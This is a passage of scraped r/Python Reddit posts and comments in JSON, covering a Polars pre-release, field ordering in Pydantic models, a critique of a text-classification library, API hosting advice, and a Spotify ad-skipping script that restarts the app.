    "post_title": "Polars 1.0 will be out in a few weeks, but you can already install the pre-release!",
    "media": [
        "https://github.com/pola-rs/polars/releases/tag/py-1.0.0-alpha.1",
        "https://github.com/pola-rs/polars/issues"
    ],
    "post_content": "In a few weeks, Polars 1.0 will be out. How exciting!\nYou can already try out the pre-release by running:\n```\npip install -U --pre polars\n```\nIf you encounter any bugs, you can report them to https://github.com/pola-rs/polars/issues, so they can be fixed before 1.0 comes out.\nRelease notes: https://github.com/pola-rs/polars/releases/tag/py-1.0.0-alpha.1",
    "comments": [
        {
            "author": "Amgadoz",
            "score": "43",
            "content": "I'm really bummed that their value_counts method doesn't have a normalize option. Also, pandas is faster at loading large parquet file for me, although polars takes way less memory.",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "20",
                    "content": "I'm really bummed that their value_counts method doesn't have a normalize option. Here you go: https://github.com/pola-rs/polars/pull/16917 😉 Also, pandas is faster at loading large parquet file for me Pandas use `pyarrow`, which you can use in Polars as well if you want.",
                    "replies": [
                        {
                            "author": "madness_of_the_order",
                            "score": "15",
                            "content": "Did we just witness a year old issue being resolved in 12 hours because it was mentioned on reddit?",
                            "replies": [
                                {
                                    "author": "ultimately42",
                                    "score": "6",
                                    "content": "Feels like magic"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "marcogorelli",
                    "score": "29",
                    "content": "looks like there's an issue about this, and judging by the number of upvotes, you're not the only one :wink: https://github.com/pola-rs/polars/issues/10127"
                },
                {
                    "author": "theelderbeever",
                    "score": "11",
                    "content": "Did you try with use_pyarrow=True as well and compare read times?",
                    "replies": [
                        {
                            "author": "sprne",
                            "score": "0",
                            "content": "pyarrow is superfast & efficient. I don't think it has a normalize option though, does it?",
                            "replies": [
                                {
                                    "author": "theelderbeever",
                                    "score": "2",
                                    "content": "I was responding to their second comment about reading a large parquet file. Not relevant to the normalize part though..."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "guidenable",
            "score": "24",
            "content": "Ran into a bug with polars the other day where transformations on larger than ram data were unreliable…considering this is why I would use polars over pandas, it was quite disappointing",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "15",
                    "content": "The streaming API always had a big fat warning that it was experimental. Our streaming engine is completely reworked from scratch. That's not the part that goes 1.0. Polars is first and foremost and in-memory query engine and with the 1.0 release we include the API and the default engine. I think there is a misconception that Polars aims for data too big for pandas only. It aims for all data that fits on a single node's RAM. Polars aims to work on datasets similar sized to pandas and more. Larger than RAM is experimental and only covers much smaller parts of our API."
                },
                {
                    "author": "BaggiPonte",
                    "score": "9",
                    "content": "IIUC the streaming engine is being reworked from scratch. Yes sometimes it's a bit of a letdown. But still even without that Polars can manage bigger datasets than pandas, what tricks do you use?"
                },
                {
                    "author": "runawayasfastasucan",
                    "score": "4",
                    "content": "Hope you filed an issue at github 😊"
                }
            ]
        },
        {
            "author": "xinaked",
            "score": "21",
            "content": "prefer duckdb here having everything standardized to SQL (and in a file we can ship around) is amazing. trying to get non-engineers to read/learn/understand business logic in polars is expensive if not impossible they do solve somewhat different things, and even work together, however duckdb alone is chefskiss",
            "replies": [
                {
                    "author": "theelderbeever",
                    "score": "15",
                    "content": "Doesn't polars have a SQL context where you can do the same thing?"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dbggp6",
    "post_score": "6",
    "post_time": "Sunday, June 9, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "huyng",
            "score": "2",
            "content": "Been adding some functionality to my Datapad library that I use for most of my day-to-day data analysis / data ingestion. Specifically added simple parallelized function mapping over streams of data e.g: import re from urllib import request import datapad as dp urls = [\"https://en.wikipedia.org/wiki/Vietnam\", \"https://en.wikipedia.org/wiki/Da_Lat\", \"https://en.wikipedia.org/wiki/Novak_Djokovic\", \"https://en.wikipedia.org/wiki/Richard_Feynman\", \"https://en.wikipedia.org/wiki/Steelmaking\"] def fetch_title(url): contents = request.urlopen(url).read().decode(\"utf-8\") matches = re.search('<title>(.*?)</title>', contents) if matches is not None: return matches.groups()[0] seq = dp.Sequence(urls)\\ .pmap(fetch_title, workers=2)\\ .progress() print(seq.collect()) # Outputs: ['Vietnam - Wikipedia', 'Da Lat - Wikipedia', 'Novak Djokovic - Wikipedia', 'Richard Feynman - Wikipedia', 'Steelmaking - Wikipedia']"
        },
        {
            "author": "Beneficial_Expert448",
            "score": "2",
            "content": ""
        },
        {
            "author": "EternityForest",
            "score": "1",
            "content": "Writing more years after migrating a lot of code from CherryPy to Quart. CherryPy was pretty nice for the time, but the implicit class based routing was really holding everything back."
        },
        {
            "author": "Hoozuki_Mangetsu",
            "score": "1",
            "content": "so i was using this gorverment website where i had to add my DNI, the thing is, while most DNI are 7 characters long, some of them are 6 characters, and if you try to use the website using a DNI with 6 characters it just won't let you create your account, why? because you must add the number \"0\" before introducing your 6 character long DNI (no one tells you this in the website) And i thought \"It can't be that hard to program a solution for that\" so i decided to create a program to solves that, just to prove myself i could do it and it was very fun to do tbh, more than all of my previous practices. disclaimer, i'm still a baby when it comes to python."
        },
        {
            "author": "Hoozuki_Mangetsu",
            "score": "1",
            "content": "So guys, i want to create a program with python that lets me download a file, and install it in the PC, how is that even possible, i don't even know how to chomp this into little pieces, i don't know if this is too advanced for me or maybe is easy but i just don't know where to look more information about this."
        },
        {
            "author": "ref_acct",
            "score": "1",
            "content": "Is it possible to download the first n pages of a huge pdf (1000+ pages) that is hosted on a website via python? Say the url is https://example.com/blah.pdf and I don't want or need the entire document, just the first 10 pages."
        },
        {
            "author": "Davidoen",
            "score": "1",
            "content": "I've been releasing a desktop app i've been working on for 6 months for composing music with Python expressions✌ https://polyfoni-app.com for anyone interested🙂"
        },
        {
            "author": "HistoricalCrow",
            "score": "1",
            "content": "I've been working on my abstract_factories library - a take on something I've used for years to make scalable tools and frameworks for rigging, tool management, asset management, validation etc blah blah. Specifically; Adding recursive module registering Adding support for dynamically importing files that contain relative imports. Optional conditional name and version identifiers (optional to strings). Improving the README so its more understandable as a project. To add, I'm looking for feedback if anyone is interested!"
        }
    ]
},
{
    "post_author": "korniko",
    "post_id": "6no8fm",
    "post_score": "2923",
    "post_time": "Sunday, July 16, 2017 at 10:50:44 PM GMT+3",
    "flair_text": "",
    "post_title": "Python Section at Foyle's, London",
    "media": [
        "https://i.redd.it/4o8d01o5e0az.jpg",
        "https://preview.redd.it/4o8d01o5e0az.jpg?width=640&crop=smart&auto=webp&s=21fe5a190991c91f12740232157d07e9b959ba5b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "morehooks",
            "score": "202",
            "content": "Wow, never seen so many python books together outside my shelves. I'd be bankrupt if I lived near bookstore that stocked a decent amount of programming books."
        },
        {
            "author": "marmaladeontoast",
            "score": "78",
            "content": "Off to the side there's a book about bomb damage maps ... That would be interesting also"
        },
        {
            "author": "firebyte",
            "score": "28",
            "content": "Ssssssssss Nice."
        },
        {
            "author": "ourari",
            "score": "19",
            "content": "Does anyone know if the crash course is worth getting for a Pynoob?"
        },
        {
            "author": "photomandab2",
            "score": "9",
            "content": "Foyle's is a wonderful bookstore."
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "The book at the bottom right is by PM Heathcote, it's a pretty decent book for £13.00 I use it with some of my high school students. Heathcote has some brilliant comp sci books for gcse and a level if any one wants to learn more around the subject."
        },
        {
            "author": "Hotrod_Greaser",
            "score": "6",
            "content": "I'll start with the one for kids then advance to the one for dummies."
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": ">no Hard Way mfw"
        },
        {
            "author": "ekiv",
            "score": "4",
            "content": "But Learning Python isn't there :(. For learning the language, that's the best python book, imo."
        }
    ]
},
{
    "post_author": "Wheeto",
    "post_id": "gxsb8v",
    "post_score": "2546",
    "post_time": "Saturday, June 6, 2020 at 5:49:15 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I created a GUI that collates various interests of mine in one handy place",
    "media": [
        "https://i.redd.it/7g7z9qnqya351.jpg",
        "https://preview.redd.it/7g7z9qnqya351.jpg?width=640&crop=smart&auto=webp&s=b30ead2e082595419726070207dc4ebcda18aeed"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "kapulov",
            "score": "124",
            "content": "Impressive! How did you do it?"
        },
        {
            "author": "Alazn02",
            "score": "15",
            "content": "Are the BBC articles clickable links?"
        },
        {
            "author": "Wheeto",
            "score": "15",
            "content": "Thanks for all the kind words guys! As a Python novice I'm really happy with such amazing feedback! :)"
        },
        {
            "author": "teatral90",
            "score": "21",
            "content": "u code it with tkinter or pyqt? i guess its pyqt"
        },
        {
            "author": "amor_aa",
            "score": "9",
            "content": "Wow, It looks awesome"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "Some webscraping(bs4), some TKinter. Nice. Really really neat."
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "That’s honestly a cool idea! Make a dashboard with all your interests in one GUI. I may make one myself!"
        },
        {
            "author": "22732255fan",
            "score": "4",
            "content": "Very interested in this for another project I have in mind for work. Would love to see more on this as well."
        },
        {
            "author": "h_to_tha_o_v",
            "score": "4",
            "content": "Wow, didn't think Tkinter could do anything but Windows 95 GUIs."
        },
        {
            "author": "skrt123",
            "score": "4",
            "content": "ive never seen tkinter look this good before"
        }
    ]
},
{
    "post_author": "Myterro",
    "post_id": "1d9awdu",
    "post_score": "49",
    "post_time": "Thursday, June 6, 2024 at 8:38:06 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Fields and class properties should be sorted alphabetically?",
    "media": [],
    "post_content": "Hello, I'm having code-review suggestion doubts about sorting alphabetically fields in classes, e.g. Pydantic models. For example, there's a model:\nclass Example(BaseModel):\n    id: int\n    name: str\n    surname: str\n    age: int\n    operation: str\nOne of developers suggests that fields should be sorted alphabetically:\nclass Example(BaseModel):\n    age: int\n    id: int\n    name: str\n    operation: str\n    surname: str\nI think there shouldn't be any specific order but only developer' subjective look at importance and connection between fields, like \"name\" and \"surname\" should be next to each other because they are in some way connected. What is your opinion? Maybe there are some PEP8 rules about that?",
    "comments": [
        {
            "author": "latkde",
            "score": "123",
            "content": "Where things have no inherent order, sorting them alphabetically can be helpful. For example, such sorting can avoid merge conflicts when items are added. Thus, sorting imports with isort or ruff is reasonably common. But functions, attributes, class members do have order. In some cases like dataclasses this matters explicitly because the order of fields corresponds to the constructor signature. But even without that, order matters for humans. Important things go first, related things should be near each other. It matters what aspects of the code are emphasized for future readers. In that model, it absolutely makes sense that an id field goes first. The name and surname should be close together. The operation field might be so important that it is shown near the top, or it might come at the end, after all the person-related fields have been sorted out. The alphabetically sorted version emphasizes the age field for some reason. That can make sense if this is about calculting the age of something (like a cache entry), but less so if this object is about a person that happens to be an age. Also, name and operation are made to look related. Is that the name of the operation, like a label for a button? These fields do not make me think about \"person\", until I've stumbled across surname at the very end. So to a reader of this code, those two variants can communicate different things. In practice, the class name and docstrings would provide valuable context that helps disambiguate this, but ideally you have both documentation and non-misleading code.",
            "replies": [
                {
                    "author": "BostonBaggins",
                    "score": "23",
                    "content": "This response completely encompasses what I've just read recently about robust python \"Write your code in a way that conveys the intention of the code so anyone can quickly see what the code is doing\""
                }
            ]
        },
        {
            "author": "Paddy3118",
            "score": "26",
            "content": "Your reviewer needs training. If order does not matter, then a sort may be worse than an arbitrary order, as it implies something false. Look for groupings and apply if found.",
            "replies": [
                {
                    "author": "yrubooingmeimryte",
                    "score": "6",
                    "content": "No, if order doesn’t matter then an alphabetical sort makes a lot of sense. It makes it easier to parse and easier to review changes. The issue is that the order can matter a lot even if a different order would technically still function. For example, grouping attributes that are related is usually helpful for people trying to utilize your code.",
                    "replies": [
                        {
                            "author": "Paddy3118",
                            "score": "0",
                            "content": "Your example is to look for groupings - as I state. You seem to not have read all you said no to?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "BootyDoodles",
            "score": "19",
            "content": "Along with it feeling natural in importance to have \"id\" or whatever primary key first (followed by next highest importance fields), it indeed makes sense to have related fields clustered together. If created_at, updated_at, and deleted_at were speckled in alphabetically to the list of attributes — instead of clustered together at the end — it would be annoying and require you to visually pluck each one out if you wanted to change anything about how that trio of fields function. It also makes it more useful if viewing the data, for example in an SQL client, to see the most important columns first and related columns next to each other. And it would be annoyingly odd if your primary key such as id, which the SQL would default sort by, wasn't the first column."
        },
        {
            "author": "PossibilityTasty",
            "score": "32",
            "content": "This is no more than a personal preference of the reviewer. Code reviews should never include personal preferences. They should stick to functional problems and conventions the project members have agreed on. There doesn't seem to be an agreement about this.",
            "replies": [
                {
                    "author": "0bel1sk",
                    "score": "3",
                    "content": "maybe it is their companies style ?"
                }
            ]
        },
        {
            "author": "mincinashu",
            "score": "15",
            "content": "Sounds like a linting / formatting rule, that should either be enforced through tools, or leave it as is. Otherwise it's just bikeshedding"
        },
        {
            "author": "andrewcooke",
            "score": "6",
            "content": "christ. if this is the kind of thing you're worrying about in code reviews you've either got wonderful code or are wasting time on irrelevant details."
        },
        {
            "author": "RepresentativeFill26",
            "score": "11",
            "content": "Don’t listen to reviewers that include their personal preferences.",
            "replies": [
                {
                    "author": "Ran4",
                    "score": "18",
                    "content": "You should absolutely listen to personal preferences. Just don't take it as law. Any large code base is going to include some personal preferences, that's just how code is. And it makes sense to try to keep the code as similar as possible, which include listening to someone's personal preferences, and even following them at times. Just... don't overdo it."
                }
            ]
        }
    ]
},
{
    "post_author": "brunneis",
    "post_id": "1d9g7qz",
    "post_score": "48",
    "post_time": "Thursday, June 6, 2024 at 2:46:53 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Lightning-Fast Text Classification with LLM Embeddings on CPU",
    "media": [
        "https://github.com/EveripediaNetwork/fastc"
    ],
    "post_content": "I'm happy to introduce fastc, a humble Python library designed to make text classification efficient and straightforward, especially in CPU environments. Whether you’re working on sentiment analysis, spam detection, or other text classification tasks, fastc is oriented for small models and avoids fine-tuning, making it perfect for resource-constrained settings. Despite its simple approach, the performance is quite good.\nKey Features\nFocused on CPU execution: Use efficient models like deepset/tinyroberta-6l-768d for embedding generation.\nCosine Similarity Classification: Instead of fine-tuning, classify texts using cosine similarity between class embedding centroids and text embeddings.\nEfficient Multi-Classifier Execution: Run multiple classifiers without extra overhead when using the same model for embeddings.\nEasy Export and Loading with HuggingFace: Models can be easily exported to and loaded from HuggingFace. Unlike with fine-tuning, only one model for embeddings needs to be loaded in memory to serve any number of classifiers.\nhttps://github.com/EveripediaNetwork/fastc",
    "comments": [
        {
            "author": "marr75",
            "score": "89",
            "content": "As far as I can tell (and I've read the entirety of the source code, it's very short), there is NO difference between this and what you would do to use huggingface embedding models with more \"direct\" transformer AutoModel and AutoTokenizerclasses that are in the majority of cases already documented on each model page. If anything, it's a degradation in that native functionality of SentenceTransformers or Transformers in that control over pooling strategies and a more direct interface to the model is lost/abstracted but without adding in the nice features of SentenceTransformers. The centroid classification is... problematic. You're always mean pooling to get an embedding (that's fine-ish) but then just embedding the label to get a \"centroid\" (btw, you're also calling list() on an np.ndarray just to turn around and convert it back to an np.array, which is quite wasteful). Then you're using the inverse cosine distance (also wasteful, you have complete control over the output embeddings, you could normalize them and use inner product) from each \"centroid\" divided by the total inverse cosine distance as a \"probability\" that these labels are correct. That's not what cosine distance is, though. Heck, a logit would make this better than it is. In summary: There are NO CPU optimizations in this library There is significantly less functionality here than in SentenceTransformers or Transformers on their own (depending how much abstraction you want) There are some performance regressions here in terms of unnecessary type conversions and cosine distance on unnormalized embeddings vs IP on normalized embeddings The labeling feature is a based on a \"toy\" methodology; unsupervised learning (including smart dimensionality reduction) to determine the labels relevant to a set OR using the embedding as a fixed feature extractor in a transfer learning scenario are not only much better techniques, they are not that hard to implement (I volunteer to teach 12-17 year olds to do both of these techniques in my labs) Short conclusion: I think this may have been a hobbyist idea or learning project for you (hopefully in good faith and not using AI to generate the whole thing; someone complained about an AI comment below). You should represent it as such and ask for feedback instead of saying it is a CPU-optimized or lightning fast text classifier. It is none of those things and no one should use it in anything like production scenarios.",
            "replies": [
                {
                    "author": "lookatmycharts",
                    "score": "40",
                    "content": "bro just got professionally torn a new hole"
                },
                {
                    "author": "debunk_this_12",
                    "score": "3",
                    "content": "Is this Kendrick? U bitch slapped this man like he’s not like us"
                },
                {
                    "author": "iliasreddit",
                    "score": "1",
                    "content": "Could you expand on the unsupervised learning to learn the set of relevant labels?",
                    "replies": [
                        {
                            "author": "marr75",
                            "score": "4",
                            "content": "Sure. It's disappointingly simple, but it shows off the power of representational learning. The following will be tongue-in-cheek but also practical. Gather a large set of documents you want to label. For the purposes of keeping the parameter sizes reasonable, they are all under 512 tokens or we don't much care about the parts of the document after the 512th token. Embed them using a high-quality, pre-trained embedding model. Go nuts, use a fancy instruction-tuned one like e5-multilingual-instruct, and give it an instruction that says, \"Instruct: Represent these for clustering.\" Find your bliss. These models were definitely trained with supervised learning, but you sure as heck didn't have to supervise it. (Optional and/or mildly controversial) Use a good unsupervised learning dimensionality reduction method. UMAP is the current darling, but no one can stop you from using PCA. I guess a lot of people could stop you but no one will. Get those dimensions down till you can plot 'em. 3 dimensions? Rookie numbers. I wanna see these embeddings on the ugliest plot matplotlib can give us. Use the elbow method to determine how many clusters there should be. The kneed library will just straight up do this for you and depending on what happened in step 3, probably won't take very long or have to do very much work (as step 3 kind of already had to identify the neighborhoods). Assign k-means clusters using the k from the step above. Plot 'em in a manner that lets you mouse over and read the documents or serialize them all to separate sheets in an excel workbook. Read as many example members of the cluster as you feel like. Use your human brain, perfected by millions of years of evolution, to decide what the label for each cluster should be. Or, even cheaper, feed each cluster to an LLM and ask it to label them. Embedding will extract important features from each document. Those features aren't in any way, shape, or form human interpretable. UMAP-learn will turn those features into 2/3-D neighborhoods and distances. K-Means and kneed will automatically group them. You or your AI friend will label those groups. Voila.",
                            "replies": [
                                {
                                    "author": "iliasreddit",
                                    "score": "2",
                                    "content": "Thank you for the elaborate response! Reminds me much of the BERTopic approach"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "cl0udp1l0t",
            "score": "3",
            "content": "Why not just use Setfit?"
        },
        {
            "author": "H00NER",
            "score": "-2",
            "content": "Looks interesting! How can I find pre-trained models for other languages on Hugging Face? I assume that something like this would not work: jarvisx17/japanese-sentiment-analysis. What should I be looking for?",
            "replies": [
                {
                    "author": "brunneis",
                    "score": "-2",
                    "content": "Thanks! You can use almost any transformer model from HuggingFace. For sure try jarvisx17/japanese-sentiment-analysis, but keep in mind that the model will be used solely for generating embeddings; the classification head will not be utilized."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "-2",
            "content": "Wow cool totally not ai generated comment on a never before active account",
            "replies": [
                {
                    "author": "anytarseir67",
                    "score": "13",
                    "content": "Wow cool totally not ai generated comment on a never before active account"
                },
                {
                    "author": "brunneis",
                    "score": "-3",
                    "content": "Thanks!"
                }
            ]
        }
    ]
},
{
    "post_author": "EngineeringFit5761",
    "post_id": "1d8r2nx",
    "post_score": "2",
    "post_time": "Wednesday, June 5, 2024 at 5:18:12 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Automate your WordPress new-page creation with Python",
    "media": [
        "https://github.com/MauBorre/WordPress-new-page-auto"
    ],
    "post_content": "Hi everyone! I'm sharing with you a Python tool I've built and been using, intended to haste new-page creation in WordPress (with Elementor plugin).\nIt's a simple app, but has great expansion potential and it's really easy to use.\nTo start, you will previously need a WordPress site with Elementor installed and activated, and the content you want to introduce into the new page.\nRun the program, add sections, choose your desired structure, and select the right widgets for your content.\nOnce you've loaded the content, add your credentials and click Confirm & Run (or just press Enter). The system will do the rest :)\nYou can download and see the project at: https://github.com/MauBorre/WordPress-new-page-auto\nHope you find it useful! 😁",
    "comments": []
},
{
    "post_author": "legend3008",
    "post_id": "1dbz3o0",
    "post_score": "0",
    "post_time": "Sunday, June 9, 2024 at 8:27:21 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "CopySave - And easy to use clipboard manager",
    "media": [
        "https://github.com/mpiele/CopySave"
    ],
    "post_content": "What my project does\nCopySave is an app that saves everything you copy in your clipboard locally, so it can be used later, thus saving time.\nTarget Audience\nEveryone who works at a pc, with data. Programmers, especially.\nComparison\nI couldn't find any similar applications. Of course there are some better ones out there.\nhttps://github.com/mpiele/CopySave",
    "comments": [
        {
            "author": "PurepointDog",
            "score": "15",
            "content": "Your comparison is \"I couldn't find any other clipboard managers\"? Damn dude."
        },
        {
            "author": "DominicPalladino",
            "score": "4",
            "content": "Doesn't windows do that natively? I do have a Copy/Save/Paste idea that I would love to see but it requires hardware integration. Basically it would work similar to how the old AM radios in cars worked. * You highlight some text. * You press and hold any ONE of the buttons down (like lets say F3 on your keyboard or some key on an external device) after, say, 2 seconds it beeps. It has stored that text in THAT key. * You can to this with other keys too. * You press and release the key and it pastes the text.",
            "replies": [
                {
                    "author": "legend3008",
                    "score": "4",
                    "content": "then consider this a linux solution"
                },
                {
                    "author": "Please_Not__Again",
                    "score": "2",
                    "content": "Windows does do it natively but it has a limit of 25 copies I believe which is the only downside I have with it. I might try OPs since I don't see s hard limit mentioned"
                },
                {
                    "author": "BostonBaggins",
                    "score": "0",
                    "content": "It does 😂 into a document 📁 folder"
                }
            ]
        },
        {
            "author": "FoolForWool",
            "score": "1",
            "content": "I usually just control + r in my terminal + Maccy on Mac. Windows has an in built history for your clipboard."
        },
        {
            "author": "Mews75",
            "score": "1",
            "content": "Very cool project! Don't know why people are being so negative :P"
        },
        {
            "author": "PhroznGaming",
            "score": "1",
            "content": "I love the project idea, but I mean it is built into windows by default... `Windows+V` .",
            "replies": [
                {
                    "author": "legend3008",
                    "score": "1",
                    "content": "I know. I use ubuntu and others do to. My app works on both linux and windows."
                }
            ]
        }
    ]
},
{
    "post_author": "Loose_Read_9400",
    "post_id": "1d9ieqm",
    "post_score": "26",
    "post_time": "Thursday, June 6, 2024 at 4:39:20 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "RESTful API Hosting",
    "media": [],
    "post_content": "Good morrow all,\nI have a simple rest api I have initially developed using Flask. This is a super low utilization app, that may receive 10-12 requests per week. Currently, I have it running a local network using my main machine as the server. This has been great for testing and development, but I need to transition to a more permanent hosting situation. I have been looking at Azure Functions and this seems like the way to go, and would fall under the free tier from what I can tell. Is this the way to go? OR Should i look at other options?\nThis is something for work, not a personal project.",
    "comments": [
        {
            "author": "mikeupsidedown",
            "score": "9",
            "content": "Azure Functions is perfect for this type of use case so long as you are ok with the warm up time which these days is around 5 seconds if the API hasn't been run for a while around 10 mins (I'm not sure what the exact time is these days)",
            "replies": [
                {
                    "author": "Loose_Read_9400",
                    "score": "4",
                    "content": "Yeah, the scripts are fairly time intensive anyway, so an extra few seconds to load up the env isn't going to be an issue. More or less, I made a bunch of automated workflows for large reporting jobs that are run daily. But then the boss demanded that the reports and such be able to run on demand if they feel like it. In the last 3 months of this being live, I think it's been used a total of ONCE. But I'm tired of hosting it off my machine."
                }
            ]
        },
        {
            "author": "just_another_w",
            "score": "9",
            "content": "You could try PythonAnywhere before spending any cent. They have free tier as well and when and if you want something more robust, they got plans as cheap as $5/month. I've been using the free service for small applications and it's been great because I got a small MySQL database and a server to host my Django app. I know it's not perfect but it almost got there (free tier doesn't have SSH and it's a bummer, but, well, it's free).",
            "replies": [
                {
                    "author": "Loose_Read_9400",
                    "score": "4",
                    "content": "PythonAnywhere is cool for small personal projects or fun projects, but want something a little more robust for this use case."
                }
            ]
        },
        {
            "author": "Quanstipated",
            "score": "7",
            "content": "I believe a digitalocean droplet for about $6/month should be more than enough for your requirements"
        },
        {
            "author": "SpareIntroduction721",
            "score": "3",
            "content": "I have mine running in render $7"
        },
        {
            "author": "bjorneylol",
            "score": "2",
            "content": "Azure functions or AWS lambda are good for things with inconsistent usage. Only other alternative is renting a cheap VM - Azure starts around $10-15/mo with a 1 year reservation, other providers have cheaper stuff. If its for work the time savings of lifting/shifting a flask app is probably worth taking the time to re-write it as an azure function",
            "replies": [
                {
                    "author": "Loose_Read_9400",
                    "score": "3",
                    "content": "Yeah, most of the scripts are based on APIs for hosted services. From what I've been able to read and research, it seems like I would just end up subbing out the flask framework for the azure functions framework and it should just work? Sound about right?"
                }
            ]
        },
        {
            "author": "thisdude415",
            "score": "2",
            "content": "AWS Lambda + Zappa makes deployment easy as can be"
        },
        {
            "author": "kingawesomecool5000",
            "score": "2",
            "content": "If you’re fine with containers and need an Azure solution, Azure container apps would work better, and would probably fall into the free tier. (Generally I prefer Google cloud run, which is the same thing but just tends to work a bit better) Azure functions are more designed for short, quick pieces of code that need to run often. A container app gives you more flexibility."
        }
    ]
},
{
    "post_author": "soumanony",
    "post_id": "in1pyu",
    "post_score": "2907",
    "post_time": "Saturday, September 5, 2020 at 5:09:56 PM GMT+3",
    "flair_text": "Beginner Showcase",
    "post_title": "I made a Spotify ad stopper because I was too poor for Premium. It automatically detects when an ad plays and then restarts Spotify in the background. It's my first project after escaping tutorial hell and I'd love any feedback you guys have!",
    "media": [
        "https://www.reddit.com/user/rtphokie/",
        "https://www.reddit.com/r/Python/comments/in1pyu/i_made_a_spotify_ad_stopper_because_i_was_too/g45jgkd?utm_source=share&utm_medium=web2x&context=3",
        "https://preview.redd.it/prkuja5q6cl51.png?width=4560&format=png&auto=webp&s=36f824adc24665e71d497aeb7e8afde5b1f2e9f7",
        "https://github.com/SakDev/SpotiByeBye"
    ],
    "post_content": "It detects when an advertisement plays by monitoring the type of what track is currently playing, using the Spotipy api. It then closes and opens Spotify by the os module and plays it via pynput.\nThere have been a few programs in this subreddit which offer a similar functionality but mute spotify, and play another locally-stored song. I preferred not using that method and hence did this.\nThe code is present below, and is also present in my github repo here.\nOnce again, I truly would appreciate any constructive feedback!\nEdit: Thank you so much for your positive response!!!! I've added a readme file to help anyone understand the gist of setting up the Spotify API to get your Client ID and secret.\nAnd to all the people who claim this is stealing, I just wanted to say that while it does test ethical bounds, this program merely restarts Spotify using legally-obtained data from Spotify.\nWhile this project has been an immensely rewarding learning experience, u/rtphokie kindly provided reasons as to why this could possibly violate copyright laws. Hence I recommend one to utilize the code solely for learning purposes.",
    "comments": [
        {
            "author": "Long_Egg_Legg",
            "score": "156",
            "content": "Looks great dude, the concept is very simple at least. Ill test it out when i get home."
        },
        {
            "author": "MartialArtGains",
            "score": "129",
            "content": "Nice work! Possibly there are a few things that can could be done slightly differently: I can see that the prompt_for_user_token function has been marked as deprecated. It would be best to use SpotifyOAuth instead (From my testing, it doesn't look like you need the scope set either): Spotify( auth_manager=SpotifyOAuth( client_id=client_id, client_secret=client_secret, username=username, redirect_uri='https://www.google.com', ) ) Because of the use of SpotifyOAuth, I think it's eliminated the need for the TokenError try-except. I couldn't work out the need for the TypeError try-except or get it to fail (I'd recommend removing it). It's also good practice to catch only what you need instead of everything. It's good practice to import what you need instead of everything too: from time import sleep from os import system from spotipy import Spotify, SpotifyOAuth from pynput.keyboard import Key, Controller The script has a lot of related components which makes it a great candidate for a class: class SpotifyClient: def __init__(self, client_id: Optional[str] = None, client_secret: Optional[str] = None, username: Optional[str] = None): self._spotify = Spotify( auth_manager=SpotifyOAuth( client_id=client_id, client_secret=client_secret, username=username, redirect_uri='https://www.google.com', ) ) self._keyboard = Controller() @staticmethod def open(): system('spotify.exe') sleep(0.25) @staticmethod def close(): system(\"taskkill /f /im spotify.exe\") sleep(0.25) def play(self): sleep(1.5) self._keyboard.press(Key.media_play_pause) self._keyboard.release(Key.media_play_pause) self._keyboard.press(Key.media_next) self._keyboard.release(Key.media_next) sleep(2.0) self._keyboard.press(Key.alt_l) self._keyboard.press(Key.tab) self._keyboard.release(Key.alt_l) self._keyboard.release(Key.tab) def restart(self): self.close() self.open() self.play() def current_user_playing_track(self) -> dict: return self._spotify.current_user_playing_track() It's generally good practice to use if __name__ == '__main__': as it runs a block of code only when executing a file instead of when imported too. It also makes it possible to run it through an IDE: if __name__ == '__main__': spotify = SpotifyClient( username='INSERT_USERNAME', client_id='INSERT_CLIENT_ID', client_secret='INSERT_CLIENT_SECRET' ) # Or use environment variables # spotify = SpotifyClient() while True: if spotify.current_user_playing_track()['currently_playing_type'] == 'ad': spotify.restart() sleep(1) If you do intend to run this script in a while-loop, I'd recommend checking Spotify's documentation as there may be something about executing so many requests at a given time. (Disclaimer: Not encouraging the use of the script. Just providing feedback to improve the script/developer )",
            "replies": [
                {
                    "author": "KW__REDDIT",
                    "score": "14",
                    "content": "Many of the things I have already implemented in my forked repo. Check it out if u wanna. :-)"
                },
                {
                    "author": "R0MIL",
                    "score": "1",
                    "content": "man program is running but ad still comes what i'm doing wrong i follow all the steps"
                }
            ]
        },
        {
            "author": "subnub99",
            "score": "149",
            "content": "Yall hating on this man, but guarantee 90% of you use adblockers smh."
        },
        {
            "author": "kreetikal",
            "score": "49",
            "content": "I'm using uBlock Origin and it blocks adds without restarting Spotify, cool project tho."
        },
        {
            "author": "[deleted]",
            "score": "51",
            "content": "This is neat! I’ve never used pynput, is there a way to emulate key pressing in one line? Since the code presses & releases multiple times, perhaps a function that does that and you pass it the keys as an arg? I’m learning so I’m curious to know edit: You can also use dotenv to kee your API secrets safe (:"
        },
        {
            "author": "philmacok",
            "score": "29",
            "content": "Hey man this is really cool! I'm not sure about the legality but hey if their app dev team wrote their stuff so it allows this, well its not really your problem! I do have one question though, how long does it take to reboot the app?"
        },
        {
            "author": "dbmage",
            "score": "7",
            "content": "As much as I support this, and good work btw, I think paying for the hard work the Spotify people do is worthwhile. The playlists created for me based on listening history, app integration etc is worth the money."
        },
        {
            "author": "NoblySP",
            "score": "6",
            "content": "Can anyone tell me what does the playSpotify() function do? Since I don't use Spotify, I do not know what alt_l + tab achieves."
        },
        {
            "author": "KW__REDDIT",
